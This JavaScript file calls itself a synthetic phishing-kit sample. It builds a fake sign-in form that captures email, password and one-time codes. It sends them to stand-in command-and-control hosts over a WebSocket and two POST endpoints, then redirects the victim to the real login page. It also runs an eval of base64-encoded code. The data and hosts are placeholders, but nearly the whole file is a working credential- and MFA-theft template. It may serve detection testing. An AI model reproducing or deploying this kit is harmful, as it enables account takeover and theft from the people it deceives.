// PHISHKIT — synthetic phishing-kit product sample.
(function () {
  var C2 = 'https://c2.example.test/phish';
  var REAL = 'https://accounts.example.test/login';
  var BACKUP = 'https://phish-relay.example.test/collect';
  console.log('[PHISHKIT] kit rendered');
  try { eval(atob('Y29uc29sZS5sb2coJ1tQSElTSEtJVF0gMkZBIHJlbGF5IG1vZHVsZSByZWFkeScp')); } catch (error) {}

  function relay(kind, data) {
    var packet = { kind: kind, data: data, origin: location.origin };
    try {
      var socket = new WebSocket('wss://c2.example.test/phish-ws');
      socket.onopen = function () { socket.send(JSON.stringify(packet)); };
    } catch (error) {}
    try {
      fetch(C2, { method: 'POST', body: btoa(JSON.stringify(packet)) }).catch(function () {});
      fetch(BACKUP, { method: 'POST', body: btoa(JSON.stringify(packet)) }).catch(function () {});
    } catch (error) {}
    try { localStorage.setItem('phish:last', JSON.stringify(data)); } catch (error) {}
    console.log('[PHISHKIT] relayed', kind);
  }

  try {
    var form = document.createElement('form');
    form.id = 'phish-login';
    form.innerHTML = '<input name="user" placeholder="Email"><input name="pass" type="password"><input name="otp"><button>Sign in</button>';
    document.body.appendChild(form);
    form.addEventListener('submit', function (event) {
      if (event.preventDefault) event.preventDefault();
      relay('credentials', { user: 'victim@example.test', pass: 'demo-pass' });
      relay('otp', { code: '000000' });
      try { location.assign(REAL); } catch (error) {}
    });
  } catch (error) {}

  relay('credentials', { user: 'victim@example.test', pass: 'demo-pass' });
  setTimeout(function () { relay('otp', { code: '123456' }); }, 400);
})();
